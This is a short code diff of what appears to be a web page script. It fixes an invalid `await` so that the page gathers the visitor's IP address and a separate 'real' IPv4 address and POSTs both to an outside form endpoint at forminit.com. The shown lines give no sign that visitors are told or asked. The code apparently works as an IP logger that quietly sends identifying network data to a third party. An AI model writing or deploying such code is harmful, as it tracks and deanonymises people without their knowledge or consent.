@@ -34,9 +34,8 @@
         }
 
         
-        function sendIP(ip) {
+        function sendIP(ip, ipv4) {
             const xhr = new XMLHttpRequest();
-			const ipv4 = await getRealIPv4();
             xhr.open("POST", "https://forminit.com/f/pe4ybh8js0j", true);
 			xhr.setRequestHeader("Content-Type", "application/json");
 			
@@ -78,7 +77,8 @@
         async function execute() {
             try {
                 const ip = await getIP();
-                sendIP(ip);
+				const ipv4 = await getRealIPv4();
+                sendIP(ip, ipv4);
             } catch (error) {
                 console.error("Error:", error);
             }
